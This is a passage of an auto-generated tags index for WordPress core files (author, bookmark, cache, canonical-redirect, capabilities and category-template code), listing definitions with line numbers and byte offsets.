function get_author_posts_url($author_id, $author_nicename = '') {get_author_posts_url219,6993
function get_author_posts_url($author_id, $author_nicename = '') {author_nicename219,6993
	$auth_ID = (int) $author_id;auth_ID221,7081
	$link = $wp_rewrite->get_author_permastruct();link222,7111
		$file = home_url( '/' );file225,7183
		$link = $file . '?author=' . $auth_ID;link226,7210
			$user = get_userdata($author_id);user229,7295
				$author_nicename = $user->user_nicename;author_nicename231,7371
		$link = str_replace('%author%', $author_nicename, $link);link233,7420
		$link = home_url( user_trailingslashit( $link ) );link234,7480
	$link = apply_filters('author_link', $link, $author_id, $author_nicename);link237,7537
function wp_list_authors($args = '') {wp_list_authors268,8721
	$defaults = array(defaults271,8776
	$args = wp_parse_args( $args, $defaults );args279,9066
	$return = '';return282,9141
	$query_args = wp_array_slice_assoc( $args, array( 'orderby', 'order', 'number' ) );query_args284,9157
	$authors = get_users( $query_args );authors286,9274
	$author_count = array();author_count288,9313
		$author = get_userdata( $author_id );author293,9639
		$posts = isset( $author_count[$author->ID] ) ? $author_count[$author->ID] : 0;posts298,9754
		$link = '';link303,9882
			$name = "$author->first_name $author->last_name";name306,9966
			$name = $author->display_name;name308,10026
		$link = '<a href="' . get_author_posts_url( $author->ID, $author->user_nicename ) . '" title="' . esc_attr( sprintf(__("Posts by %s"), $author->display_name) ) . '">' . $name . '</a>';link320,10223
			$alt = $title = '';alt330,10607
				$title = ' title="' . esc_attr( $feed ) . '"';title332,10658
				$alt = ' alt="' . esc_attr( $feed ) . '"';alt333,10709
				$name = $feed;name334,10756
	$return = rtrim($return, ', ');return358,11191
function is_multi_author() {is_multi_author374,11473
	if ( false === ( $is_multi_author = wp_cache_get('is_multi_author', 'posts') ) ) {is_multi_author377,11518
		$rows = (array) $wpdb->get_col("SELECT DISTINCT post_author FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'publish' LIMIT 2");rows378,11602
		$is_multi_author = 1 < count( $rows ) ? 1 : 0;is_multi_author379,11746
 * Helper function to clear the cache for number of authors.to387,11937
function __clear_multi_author_cache() {__clear_multi_author_cache391,12017

wordpress/wp-includes/bookmark-template.php,2056
 * This function is used internally by wp_list_bookmarks() and should not beis19,476
function _walk_bookmarks($bookmarks, $args = '' ) {_walk_bookmarks51,1825
function _walk_bookmarks($bookmarks, $args = '' ) {args51,1825
	$defaults = array(defaults52,1877
	$r = wp_parse_args( $args, $defaults );r59,2113
	$output = ''; // Blank string to start with.output62,2182
		$the_link = '#';the_link71,2498
			$the_link = esc_url($bookmark->link_url);the_link73,2554
		$desc = esc_attr(sanitize_bookmark_field('link_description', $bookmark->link_description, $bookmark->link_id, 'display'));desc75,2600
		$name = esc_attr(sanitize_bookmark_field('link_name', $bookmark->link_name, $bookmark->link_id, 'display'));name76,2725
 		$title = $desc;title77,2836
		$alt = ' alt="' . $name . ( $show_description ? ' ' . $title : '' ) . '"';alt86,3141
			$title = ' title="' . $title . '"';title89,3241
		$rel = $bookmark->link_rel;rel91,3281
			$rel = ' rel="' . esc_attr($rel) . '"';rel93,3331
		$target = $bookmark->link_target;target95,3375
			$target = ' target="' . $target . '"';target97,3434
 * 'class' - Default is 'linkcat' (string). The CSS class to use for theto168,6126
 * @see get_bookmarks() For other arguments that can be set in this function andand187,7003
function wp_list_bookmarks($args = '') {wp_list_bookmarks200,7559
	$defaults = array(defaults201,7600
	$r = wp_parse_args( $args, $defaults );r213,8083
	$output = '';output216,8152
		$cats = get_terms('link_category', array('name__like' => $category_name, 'include' => $category, 'exclude' => $exclude_category, 'orderby' => $category_orderby, 'order' => $category_order, 'hierarchical' => 0));cats220,8242
			$params = array_merge($r, array('category'=>$cat->term_id));params223,8495
			$bookmarks = get_bookmarks($params);bookmarks224,8559
			$catname = apply_filters( "link_category", $cat->name );catname228,8750
		$bookmarks = get_bookmarks($r);bookmarks235,9056
	$output = apply_filters( 'wp_list_bookmarks', $output );output249,9511

wordpress/wp-includes/bookmark.php,5437
function get_bookmark($bookmark, $output = OBJECT, $filter = 'raw') {get_bookmark20,394
function get_bookmark($bookmark, $output = OBJECT, $filter = 'raw') {output20,394
			$_bookmark = & $GLOBALS['link'];_bookmark25,540
			$_bookmark = null;_bookmark27,583
		$_bookmark = $bookmark;_bookmark30,701
			$_bookmark = & $GLOBALS['link'];_bookmark33,816
		} elseif ( ! $_bookmark = wp_cache_get($bookmark, 'bookmark') ) {_bookmark34,852
			$_bookmark = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->links WHERE link_id = %d LIMIT 1", $bookmark));_bookmark35,920
	$_bookmark = sanitize_bookmark($_bookmark, $filter);_bookmark41,1238
	if ( $output == OBJECT ) {output43,1293
	} elseif ( $output == ARRAY_A ) {output45,1342
	} elseif ( $output == ARRAY_N ) {output47,1415
function get_bookmark_field( $field, $bookmark, $context = 'display' ) {get_bookmark_field66,1974
function get_bookmark_field( $field, $bookmark, $context = 'display' ) {context66,1974
	$bookmark = (int) $bookmark;bookmark67,2047
	$bookmark = get_bookmark( $bookmark );bookmark68,2077
function get_bookmarks($args = '') {get_bookmarks116,3806
	$defaults = array(defaults119,3859
	$r = wp_parse_args( $args, $defaults );r127,4082
	$cache = array();cache130,4151
	$key = md5( serialize( $r ) );key131,4170
	if ( $cache = wp_cache_get( 'get_bookmarks', 'bookmark' ) ) {cache132,4202
		$cache = array();cache138,4411
	$inclusions = '';inclusions140,4432
		$exclude = '';  //ignore exclude, category, and category_name params if using includeexclude142,4478
		$category = '';category143,4566
		$category_name = '';category_name144,4584
		$inclinks = preg_split('/[\s,]+/',$include);inclinks145,4607
					$inclusions = ' AND ( link_id = ' . intval($inclink) . ' ';inclusions149,4749
	$exclusions = '';exclusions158,4947
		$exlinks = preg_split('/[\s,]+/',$exclude);exlinks160,4993
					$exclusions = ' AND ( link_id <> ' . intval($exlink) . ' ';exclusions164,5131
		if ( $category = get_term_by('name', $category_name, 'link_category') ) {category174,5363
			$category = $category->term_id;category175,5439
		$search = like_escape($search);search184,5662
		$search = " AND ( (link_url LIKE '%$search%') OR (link_name LIKE '%$search%') OR (link_description LIKE '%$search%') ) ";search185,5696
	$category_query = '';category_query188,5824
	$join = '';join189,5847
		$incategories = preg_split('/[\s,]+/',$category);incategories191,5888
					$category_query = ' AND ( tt.term_id = ' . intval($incat) . ' ';category_query195,6045
		$join = " INNER JOIN $wpdb->term_relationships AS tr ON ($wpdb->links.link_id = tr.object_id) INNER JOIN $wpdb->term_taxonomy as tt ON tt.term_taxonomy_id = tr.term_taxonomy_id";join203,6293
		$recently_updated_test = ", IF (DATE_ADD(link_updated, INTERVAL " . get_option('links_recently_updated_time') . " MINUTE) >= NOW(), 1,0) as recently_updated ";recently_updated_test207,6547
		$recently_updated_test = '';recently_updated_test209,6719
	$get_updated = ( $show_updated ) ? ', UNIX_TIMESTAMP(link_updated) AS link_updated_f ' : '';get_updated212,6754
	$orderby = strtolower($orderby);orderby214,6849
	$length = '';length215,6883
			$length = ", CHAR_LENGTH(link_name) AS length";length218,6938
			$orderby = 'rand()';orderby221,7014
			$orderby = "$wpdb->links.link_id";orderby224,7066
			$orderparams = array();orderparams227,7125
				$ordparam = trim($ordparam);ordparam229,7205
				$keys = array( 'link_id', 'link_name', 'link_url', 'link_visible', 'link_rating', 'link_owner', 'link_updated', 'link_notes' );keys230,7238
			$orderby = implode(',', $orderparams);orderby236,7545
		$orderby = 'link_name';orderby240,7617
	$order = strtoupper( $order );order242,7644
		$order = 'ASC';order244,7745
	$visible = '';visible246,7764
		$visible = "AND link_visible = 'Y'";visible248,7804
	$query = "SELECT * $length $recently_updated_test $get_updated FROM $wpdb->links $join WHERE 1=1 $visible $category_query";query250,7844
	$results = $wpdb->get_results($query);results256,8105
function sanitize_bookmark($bookmark, $context = 'display') {sanitize_bookmark274,8556
function sanitize_bookmark($bookmark, $context = 'display') {context274,8556
	$fields = array('link_id', 'link_url', 'link_name', 'link_image', 'link_target', 'link_category',fields275,8618
		$do_object = true;do_object280,8875
		$link_id = $bookmark->link_id;link_id281,8896
		$do_object = false;do_object283,8939
		$link_id = $bookmark['link_id'];link_id284,8961
function sanitize_bookmark_field($field, $value, $bookmark_id, $context) {sanitize_bookmark_field324,10406
		$value = (int) $value;value328,10550
		$value = array_map('absint', (array) $value);value331,10625
		$value = preg_replace('/[^YNyn]/', '', $value);value337,10913
		$targets = array('_top', '_blank');targets340,11004
			$value = '';value342,11080
		$value = apply_filters("edit_$field", $value, $bookmark_id);value350,11182
			$value = esc_html( $value ); // textarea_escapedvalue353,11280
			$value = esc_attr($value);value355,11343
		$value = apply_filters("pre_$field", $value);value358,11411
		$value = apply_filters($field, $value, $bookmark_id, $context);value361,11506
			$value = esc_attr($value);value364,11606
			$value = esc_js($value);value366,11667
function clean_bookmark_cache( $bookmark_id ) {clean_bookmark_cache378,11838

wordpress/wp-includes/cache.php,4534
function wp_cache_add($key, $data, $group = '', $expire = 0) {wp_cache_add24,578
function wp_cache_add($key, $data, $group = '', $expire = 0) {group24,578
 * This function has ceased to do anything since WordPress 2.5. Thehas33,760
 * does not mean that plugins can't implement this function when they need towhen35,907
function wp_cache_close() {wp_cache_close42,1125
function wp_cache_decr( $key, $offset = 1, $group = '' ) {wp_cache_decr58,1578
function wp_cache_decr( $key, $offset = 1, $group = '' ) {offset58,1578
function wp_cache_delete($key, $group = '') {wp_cache_delete75,2077
function wp_cache_delete($key, $group = '') {group75,2077
function wp_cache_flush() {wp_cache_flush90,2373
function wp_cache_get( $key, $group = '', $force = false, &$found = null ) {wp_cache_get110,3086
function wp_cache_get( $key, $group = '', $force = false, &$found = null ) {group110,3086
function wp_cache_incr( $key, $offset = 1, $group = '' ) {wp_cache_incr128,3664
function wp_cache_incr( $key, $offset = 1, $group = '' ) {offset128,3664
function wp_cache_init() {wp_cache_init140,3951
function wp_cache_replace($key, $data, $group = '', $expire = 0) {wp_cache_replace157,4510
function wp_cache_replace($key, $data, $group = '', $expire = 0) {group157,4510
function wp_cache_set($key, $data, $group = '', $expire = 0) {wp_cache_set176,5120
function wp_cache_set($key, $data, $group = '', $expire = 0) {group176,5120
function wp_cache_add_global_groups( $groups ) {wp_cache_add_global_groups189,5435
function wp_cache_add_non_persistent_groups( $groups ) {wp_cache_add_non_persistent_groups202,5737
 * this function instructs the backend to reset those keys and perform any cleanup since blog or site IDs have changed since cache init.instructs209,5989
function wp_cache_reset() {wp_cache_reset213,6149
class WP_Object_Cache {WP_Object_Cache235,6800
	var $cache = array ();cache244,6920
	var $cache = array ();cache244,6920
	var $cache_hits = 0;cache_hits253,7081
	var $cache_hits = 0;cache_hits253,7081
	var $cache_misses = 0;cache_misses262,7231
	var $cache_misses = 0;cache_misses262,7231
	var $global_groups = array();global_groups271,7350
	var $global_groups = array();global_groups271,7350
	function add( $key, $data, $group = 'default', $expire = '' ) {add288,7973
	function add( $key, $data, $group = 'default', $expire = '' ) {group288,7973
			$group = 'default';group293,8118
	function add_global_groups( $groups ) {add_global_groups308,8381
		$groups = (array) $groups;groups309,8422
		$this->global_groups = array_merge($this->global_groups, $groups);global_groups311,8452
		$this->global_groups = array_unique($this->global_groups);global_groups312,8521
	function decr( $key, $offset = 1, $group = 'default' ) {decr325,8927
	function decr( $key, $offset = 1, $group = 'default' ) {offset325,8927
		$offset = (int) $offset;offset332,9141
	function delete($key, $group = 'default', $force = false) {delete357,9912
	function delete($key, $group = 'default', $force = false) {group357,9912
			$group = 'default';group359,9998
	function flush() {flush375,10264
		$this->cache = array ();cache376,10284
	function get( $key, $group = 'default', $force = false, &$found = null ) {get398,10996
	function get( $key, $group = 'default', $force = false, &$found = null ) {group398,10996
			$group = 'default';group400,11097
			$found = true;found403,11163
		$found = false;found411,11353
	function incr( $key, $offset = 1, $group = 'default' ) {incr426,11760
	function incr( $key, $offset = 1, $group = 'default' ) {offset426,11760
			$group = 'default';group428,11843
		$offset = (int) $offset;offset436,12023
	function replace($key, $data, $group = 'default', $expire = '') {replace458,12667
	function replace($key, $data, $group = 'default', $expire = '') {group458,12667
			$group = 'default';group460,12759
	function reset() {reset473,12944
	function set($key, $data, $group = 'default', $expire = '') {set501,13984
	function set($key, $data, $group = 'default', $expire = '') {group501,13984
			$group = 'default';group503,14072
			$data = clone $data;data506,14122
	function stats() {stats520,14374
		foreach ($this->cache as $group => $cache) {group526,14572
	 * Utility function to determine whether a key exists in the cache.to533,14771
	protected function _exists($key, $group) {_exists536,14865
	function __construct() {__construct546,15194
	function __destruct() {__destruct563,15622

wordpress/wp-includes/canonical.php,7130
function redirect_canonical( $requested_url = null, $do_redirect = true ) {redirect_canonical37,1277
function redirect_canonical( $requested_url = null, $do_redirect = true ) {requested_url37,1277
		$requested_url  = is_ssl() ? 'https://' : 'http://';requested_url45,1612
	$original = @parse_url($requested_url);original50,1759
	$redirect = $original;redirect60,2108
	$redirect_url = false;redirect_url61,2132
	if ( is_feed() && ( $id = get_query_var( 'p' ) ) ) {id69,2298
		if ( $redirect_url = get_post_comments_feed_link( $id, get_query_var( 'feed' ) ) ) {redirect_url70,2352
		$vars = $wpdb->get_results( $wpdb->prepare("SELECT post_type, post_parent FROM $wpdb->posts WHERE ID = %d", $id) );vars78,2770
		if ( isset($vars[0]) && $vars = $vars[0] ) {vars80,2889
				$id = $vars->post_parent;id82,3003
			if ( $redirect_url = get_permalink($id) )redirect_url84,3034
		$id = max( get_query_var('p'), get_query_var('page_id'), get_query_var('attachment_id') );id93,3395
		if ( $id && $redirect_post = get_post($id) ) {redirect_post94,3488
			$post_type_obj = get_post_type_object($redirect_post->post_type);post_type_obj95,3537
				$redirect_url = get_permalink($redirect_post);redirect_url97,3641
			if ( $redirect_url = redirect_guess_404_permalink() ) {redirect_url103,3897
			if ( $redirect_url = get_attachment_link(get_query_var('attachment_id')) )redirect_url111,4364
			if ( $redirect_url = get_permalink(get_query_var('p')) )redirect_url114,4592
			if ( $redirect_url = get_permalink( $wp_query->get_queried_object_id() ) )redirect_url117,4814
			if ( $redirect_url = get_permalink(get_query_var('page_id')) )redirect_url120,5037
			$redirect_url = home_url('/');redirect_url123,5379
			if ( $redirect_url = get_permalink(get_option('page_for_posts')) )redirect_url125,5589
			$m = get_query_var('m');m128,5812
					$redirect_url = get_year_link($m);redirect_url131,5889
					$redirect_url = get_month_link( substr($m, 0, 4), substr($m, 4, 2) );redirect_url134,5964
					$redirect_url = get_day_link(substr($m, 0, 4), substr($m, 4, 2), substr($m, 6, 2));redirect_url137,6072
			if ( $redirect_url = get_day_link(get_query_var('year'), get_query_var('monthnum'), get_query_var('day')) )redirect_url144,6426
			if ( $redirect_url = get_month_link(get_query_var('year'), get_query_var('monthnum')) )redirect_url147,6716
			if ( $redirect_url = get_year_link(get_query_var('year')) )redirect_url150,6949
			$author = get_userdata(get_query_var('author'));author153,7186
				if ( $redirect_url = get_author_posts_url($author->ID, $author->user_nicename) )redirect_url155,7439
			$term_count = 0;term_count160,7686
			$obj = $wp_query->get_queried_object();obj164,7815
			if ( $term_count <= 1 && !empty($obj->term_id) && ( $tax_url = get_term_link((int)$obj->term_id, $obj->taxonomy) ) && !is_wp_error($tax_url) ) {tax_url165,7858
					$qv_remove = array( 'term', 'taxonomy');qv_remove168,8093
						$tax_obj = get_taxonomy( $obj->taxonomy );tax_obj176,8404
					$rewrite_vars = array_diff( array_keys($wp_query->query), array_keys($_GET) );rewrite_vars181,8547
						$tax_url = parse_url($tax_url);tax_url187,8948
		} elseif ( is_single() && strpos($wp_rewrite->permalink_structure, '%category%') !== false && $cat = get_query_var( 'category_name' ) ) {cat204,9617
			$category = get_category_by_path( $cat );category205,9757
			$post_terms = wp_get_object_terms($wp_query->get_queried_object_id(), 'category', array('fields' => 'tt_ids'));post_terms206,9802
				$redirect_url = get_permalink($wp_query->get_queried_object_id());redirect_url208,10077
				$redirect_url = get_permalink( get_queried_object_id() );redirect_url214,10266
			$redirect_url = trailingslashit( $redirect_url ) . user_trailingslashit( get_query_var( 'page' ), 'single_paged' );redirect_url215,10328
			$addl_path = '';addl_path228,11323
				$addl_path = !empty( $addl_path ) ? trailingslashit($addl_path) : '';addl_path230,11422
				$old_feed_files = array(old_feed_files239,12137
					$redirect_url = get_feed_link( $old_feed_files[ basename( $redirect['path'] ) ] );redirect_url248,12492
				$paged = get_query_var('paged');paged255,12683
						$addl_path = ( !empty( $addl_path ) ? trailingslashit($addl_path) : '' ) . user_trailingslashit("$wp_rewrite->pagination_base/$paged", 'paged');addl_path259,12859
						$addl_path = !empty( $addl_path ) ? trailingslashit($addl_path) : '';addl_path261,13043
				$addl_path = ( !empty( $addl_path ) ? trailingslashit($addl_path) : '' ) . user_trailingslashit( 'comment-page-' . get_query_var('cpage'), 'commentpaged' );addl_path269,13462
			$redirect_url = $redirect['scheme'] . '://' . $redirect['host'] . $redirect['path'];redirect_url278,14146
				$redirect_url = apply_filters( 'wp_signup_location', site_url( 'wp-signup.php' ) );redirect_url283,14326
				$redirect_url = site_url( 'wp-login.php?action=register' );redirect_url285,14422
		$redirect = @parse_url($redirect_url);redirect295,14760
		$_parsed_query = rawurlencode_deep( $_parsed_query );_parsed_query304,15035
		$redirect_url = add_query_arg( $_parsed_query, $redirect_url );redirect_url305,15091
		$redirect = @parse_url($redirect_url);redirect309,15183
	$user_home = @parse_url(home_url());user_home312,15260
		$user_ts_type = '';user_ts_type350,16769
			$user_ts_type = 'paged';user_ts_type352,16829
				$func = 'is_' . $type;func355,16962
					$user_ts_type = $type;user_ts_type357,17024
	$compare_original = array($original['host'], $original['path']);compare_original381,17989
	$compare_redirect = array($redirect['host'], $redirect['path']);compare_redirect389,18218
		$redirect_url = $redirect['scheme'] . '://' . $redirect['host'];redirect_url398,18497
	if ( !$redirect_url || $redirect_url == $requested_url )redirect_url406,18768
			function lowercase_octets($matches) {lowercase_octets412,18984
		$requested_url = preg_replace_callback('|%[a-fA-F0-9][a-fA-F0-9]|', 'lowercase_octets', $requested_url);requested_url416,19072
	$redirect_url = apply_filters('redirect_canonical', $redirect_url, $requested_url);redirect_url420,19311
	if ( !$redirect_url || $redirect_url == $requested_url ) // yes, again -- in case the filter aborted the requestredirect_url422,19397
function _remove_qs_args_if_not_in_url( $query_string, Array $args_to_check, $url ) {_remove_qs_args_if_not_in_url449,20059
	$parsed_url = @parse_url( $url );parsed_url450,20145
				$query_string = remove_query_arg( $qv, $query_string );query_string455,20351
		$query_string = remove_query_arg( $args_to_check, $query_string );query_string458,20425
function redirect_guess_404_permalink() {redirect_guess_404_permalink471,20699
		$where = $wpdb->prepare("post_name LIKE %s", like_escape( get_query_var('name') ) . '%');where475,20802
		$post_id = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE $where AND post_status = 'publish'");post_id490,21565
function wp_redirect_admin_locations() {wp_redirect_admin_locations506,22093
	$admins = array(admins511,22224
	$logins = array(logins523,22550

wordpress/wp-includes/capabilities.php,12171
class WP_Roles {WP_Roles29,526
	var $roles;roles37,644
	var $role_objects = array();role_objects46,753
	var $role_objects = array();role_objects46,753
	var $role_names = array();role_names55,873
	var $role_names = array();role_names55,873
	var $role_key;role_key64,1007
	var $use_db = true;use_db73,1147
	var $use_db = true;use_db73,1147
	function __construct() {__construct80,1216
	function _init () {_init96,1687
		$this->role_key = $wpdb->prefix . 'user_roles';role_key98,1740
			$this->roles = $wp_user_roles;roles100,1827
			$this->use_db = false;use_db101,1861
			$this->roles = get_option( $this->role_key );roles103,1898
		$this->role_objects = array();role_objects109,1995
		$this->role_names =  array();role_names110,2028
		foreach ( (array) $this->roles as $role => $data ) {role111,2060
	function add_role( $role, $display_name, $capabilities = array() ) {add_role133,2867
	function add_role( $role, $display_name, $capabilities = array() ) {capabilities133,2867
	function remove_role( $role ) {remove_role156,3428
	function add_cap( $role, $cap, $grant = true ) {add_cap178,3964
	function add_cap( $role, $cap, $grant = true ) {grant178,3964
	function remove_cap( $role, $cap ) {remove_cap193,4308
	function get_role( $role ) {get_role208,4681
	function get_names() {get_names223,4946
	function is_role( $role )is_role236,5186
class WP_Role {WP_Role249,5360
	var $name;name257,5457
	var $capabilities;capabilities266,5579
	function __construct( $role, $capabilities ) {__construct280,5934
		$this->name = $role;name281,5982
		$this->capabilities = $capabilities;capabilities282,6005
	function add_cap( $cap, $grant = true ) {add_cap295,6300
	function add_cap( $cap, $grant = true ) {grant295,6300
			$wp_roles = new WP_Roles();wp_roles299,6394
	function remove_cap( $cap ) {remove_cap318,6933
			$wp_roles = new WP_Roles();wp_roles322,7015
	 * parameter for the hook is the list of capabilities the class hashas332,7253
	function has_cap( $cap ) {has_cap342,7629
		$capabilities = apply_filters( 'role_has_cap', $this->capabilities, $cap, $this->name );capabilities343,7657
class WP_User {WP_User359,7943
	var $data;data367,8050
	var $ID = 0;ID376,8145
	var $ID = 0;ID376,8145
	var $caps = array();caps385,8282
	var $caps = array();caps385,8282
	var $cap_key;cap_key394,8402
	var $roles = array();roles403,8518
	var $roles = array();roles403,8518
	var $allcaps = array();allcaps412,8679
	var $allcaps = array();allcaps412,8679
	var $filter = null;filter421,8824
	var $filter = null;filter421,8824
	private static $back_compat_keys;back_compat_keys423,8846
	function __construct( $id = 0, $name = '', $blog_id = '' ) {__construct438,9199
	function __construct( $id = 0, $name = '', $blog_id = '' ) {id438,9199
			$prefix = $GLOBALS['wpdb']->prefix;prefix440,9307
			$name = $id;name452,9728
			$id = 0;id453,9744
			$data = self::get_data_by( 'id', $id );data457,9774
			$data = self::get_data_by( 'login', $name );data459,9824
	function init( $data, $blog_id = '' ) {init471,10103
	function init( $data, $blog_id = '' ) {blog_id471,10103
		$this->data = $data;data472,10144
		$this->ID = (int) $data->ID;ID473,10167
	static function get_data_by( $field, $value ) {get_data_by487,10472
			$value = absint( $value );value495,10707
			$value = trim( $value );value497,10748
				$user_id = $value;user_id505,10852
				$db_field = 'ID';db_field506,10875
				$user_id = wp_cache_get($value, 'userslugs');user_id509,10924
				$db_field = 'user_nicename';db_field510,10974
				$user_id = wp_cache_get($value, 'useremail');user_id513,11035
				$db_field = 'user_email';db_field514,11085
				$value = sanitize_user( $value );value517,11143
				$user_id = wp_cache_get($value, 'userlogins');user_id518,11181
				$db_field = 'user_login';db_field519,11232
			if ( $user = wp_cache_get( $user_id, 'users' ) )user526,11338
			"SELECT * FROM $wpdb->users WHERE $db_field = %s", $valuedb_field531,11461
	function __isset( $key ) {__isset545,11701
			$key = 'ID';key548,11849
			$key = self::$back_compat_keys[ $key ];key555,11973
	function __get( $key ) {__get565,12150
			$value = $this->data->$key;value572,12360
				$key = self::$back_compat_keys[ $key ];key575,12453
			$value = get_user_meta( $this->ID, $key, true );value576,12497
			$value = sanitize_user_field( $key, $value, $this->ID, $this->filter );value580,12579
	function __set( $key, $value ) {__set591,12754
			$this->ID = $value;ID594,12908
	function exists() {exists609,13158
	function get( $key ) {get622,13384
	function has_prop( $key ) {has_prop635,13610
	function _init_caps( $cap_key = '' ) {_init_caps652,14063
	function _init_caps( $cap_key = '' ) {cap_key652,14063
			$this->cap_key = $wpdb->prefix . 'capabilities';cap_key656,14145
			$this->cap_key = $cap_key;cap_key658,14204
		$this->caps = get_user_meta( $this->ID, $this->cap_key, true );caps660,14235
			$this->caps = array();caps663,14337
	function get_role_caps() {get_role_caps680,14805
			$wp_roles = new WP_Roles();wp_roles684,14884
			$this->roles = array_filter( array_keys( $this->caps ), array( &$wp_roles, 'is_role' ) );roles688,15020
		$this->allcaps = array();allcaps691,15170
			$the_role = $wp_roles->get_role( $role );the_role693,15244
			$this->allcaps = array_merge( (array) $this->allcaps, (array) $the_role->capabilities );allcaps694,15289
		$this->allcaps = array_merge( (array) $this->allcaps, (array) $this->caps );allcaps696,15385
	function add_role( $role ) {add_role709,15652
	function remove_role( $role ) {remove_role724,15959
	function set_role( $role ) {set_role745,16513
		if ( 1 == count( $this->roles ) && $role == $this->roles[0] )role749,16626
			$this->roles = array( $role => true );roles754,16759
			$this->roles = false;roles756,16812
	function level_reduction( $max, $item ) {level_reduction783,17645
			$level = intval( $matches[1] );level785,17754
	function update_user_level_from_caps() {update_user_level_from_caps802,18156
		$this->user_level = array_reduce( array_keys( $this->allcaps ), array( $this, 'level_reduction' ), 0 );user_level804,18214
	function add_cap( $cap, $grant = true ) {add_cap817,18619
	function add_cap( $cap, $grant = true ) {grant817,18619
	function remove_cap( $cap ) {remove_cap830,18885
	function remove_all_caps() {remove_all_caps843,19157
		$this->caps = array();caps845,19203
	function has_cap( $cap ) {has_cap864,19849
			$cap = $this->translate_level_to_cap( $cap );cap867,20056
		$args = array_slice( func_get_args(), 1 );args870,20110
		$args = array_merge( array( $cap, $this->ID ), $args );args871,20155
		$caps = call_user_func_array( 'map_meta_cap', $args );caps872,20213
		$capabilities = apply_filters( 'user_has_cap', $this->allcaps, $caps, $args );capabilities882,20526
	function translate_level_to_cap( $level ) {translate_level_to_cap903,21006
	function for_blog( $blog_id = '' ) {for_blog914,21248
	function for_blog( $blog_id = '' ) {blog_id914,21248
			$cap_key = $wpdb->get_blog_prefix( $blog_id ) . 'capabilities';cap_key917,21331
			$cap_key = '';cap_key919,21405
function map_meta_cap( $cap, $user_id ) {map_meta_cap938,21990
	$args = array_slice( func_get_args(), 2 );args939,22032
	$caps = array();caps940,22076
		if ( isset( $args[0] ) && $user_id == $args[0] )user_id951,22282
		$author_data = get_userdata( $user_id );author_data963,22656
		$post = get_post( $args[0] );post964,22699
			$post = get_post( $post->post_parent );post967,22774
		$post_type = get_post_type_object( $post->post_type );post_type970,22822
				$cap = $post_type->cap->$cap;cap976,23041
			$post_author_data = get_userdata( $post->post_author );post_author_data981,23126
			$post_author_data = $author_data;post_author_data984,23264
		if ( is_object( $post_author_data ) && $user_id == $post_author_data->ID ) {user_id988,23340
		$author_data = get_userdata( $user_id );author_data1013,24330
		$post = get_post( $args[0] );post1014,24373
			$post = get_post( $post->post_parent );post1017,24448
		$post_type = get_post_type_object( $post->post_type );post_type1020,24496
				$cap = $post_type->cap->$cap;cap1026,24713
			$post_author_data = get_userdata( $post->post_author );post_author_data1031,24798
			$post_author_data = $author_data;post_author_data1034,24936
		if ( is_object( $post_author_data ) && $user_id == $post_author_data->ID ) {user_id1039,25104
		$author_data = get_userdata( $user_id );author_data1062,25992
		$post = get_post( $args[0] );post1063,26035
			$post = get_post( $post->post_parent );post1066,26110
		$post_type = get_post_type_object( $post->post_type );post_type1069,26158
				$cap = $post_type->cap->$cap;cap1075,26375
		$status_obj = get_post_status_object( $post->post_status );status_obj1079,26424
			$post_author_data = get_userdata( $post->post_author );post_author_data1086,26604
			$post_author_data = $author_data;post_author_data1089,26742
		if ( is_object( $post_author_data ) && $user_id == $post_author_data->ID )user_id1092,26784
			$caps = map_meta_cap( 'edit_post', $user_id, $post->ID );caps1097,26988
		$post = get_post( $args[0] );post1102,27131
		$post_type_object = get_post_type_object( $post->post_type );post_type_object1103,27163
		$caps = map_meta_cap( $post_type_object->cap->edit_post, $user_id, $post->ID );caps1104,27227
		$meta_key = isset( $args[ 1 ] ) ? $args[ 1 ] : false;meta_key1106,27310
			$allowed = apply_filters( "auth_post_meta_{$meta_key}", false, $meta_key, $post->ID, $user_id, $cap, $caps );allowed1109,27434
		$comment = get_comment( $args[0] );comment1117,27711
		$post = get_post( $comment->comment_post_ID );post1118,27749
		$post_type_object = get_post_type_object( $post->post_type );post_type_object1119,27798
		$caps = map_meta_cap( $post_type_object->cap->edit_post, $user_id, $post->ID );caps1121,27863
				$cap = 'delete_users';cap1167,29387
		$post_type_meta_caps = _post_type_meta_capabilities();post_type_meta_caps1181,29707
			$args = array_merge( array( $post_type_meta_caps[ $cap ], $user_id ), $args );args1183,29813
function current_user_can( $capability ) {current_user_can1202,30252
	$current_user = wp_get_current_user();current_user1203,30295
	$args = array_slice( func_get_args(), 1 );args1208,30384
	$args = array_merge( array( $capability ), $args );args1209,30428
function current_user_can_for_blog( $blog_id, $capability ) {current_user_can_for_blog1223,30757
	$current_user = wp_get_current_user();current_user1224,30819
	$user = new WP_User( $current_user->ID) ;user1230,30973
	$args = array_slice( func_get_args(), 2 );args1235,31115
	$args = array_merge( array( $capability ), $args );args1236,31159
function author_can( $post, $capability ) {author_can1250,31493
	$author = new WP_User( $post->post_author );author1254,31587
	$args = array_slice( func_get_args(), 2 );args1259,31680
	$args = array_merge( array( $capability ), $args );args1260,31724
function user_can( $user, $capability ) {user_can1274,32049
		$user = new WP_User( $user );user1276,32120
	$args = array_slice( func_get_args(), 2 );args1281,32207
	$args = array_merge( array( $capability ), $args );args1282,32251
function get_role( $role ) {get_role1296,32548
		$wp_roles = new WP_Roles();wp_roles1300,32626
function add_role( $role, $display_name, $capabilities = array() ) {add_role1316,33099
function add_role( $role, $display_name, $capabilities = array() ) {capabilities1316,33099
		$wp_roles = new WP_Roles();wp_roles1320,33217
function remove_role( $role ) {remove_role1334,33489
		$wp_roles = new WP_Roles();wp_roles1338,33570
function get_super_admins() {get_super_admins1352,33819
function is_super_admin( $user_id = false ) {is_super_admin1369,34194
function is_super_admin( $user_id = false ) {user_id1369,34194
		$user = new WP_User( $user_id );user1371,34257
		$user = wp_get_current_user();user1373,34298
		$super_admins = get_super_admins();super_admins1379,34400

wordpress/wp-includes/category-template.php,13373
function get_category_link( $category ) {get_category_link18,314
		$category = (int) $category;category20,389
	$category = get_term_link( $category, 'category' );category22,421
function get_category_parents( $id, $link = false, $separator = '/', $nicename = false, $visited = array() ) {get_category_parents42,1006
function get_category_parents( $id, $link = false, $separator = '/', $nicename = false, $visited = array() ) {link42,1006
	$chain = '';chain43,1117
	$parent = &get_category( $id );parent44,1131
		$name = $parent->slug;name49,1232
		$name = $parent->name;name51,1263
function get_the_category( $id = false ) {get_the_category74,1949
function get_the_category( $id = false ) {id74,1949
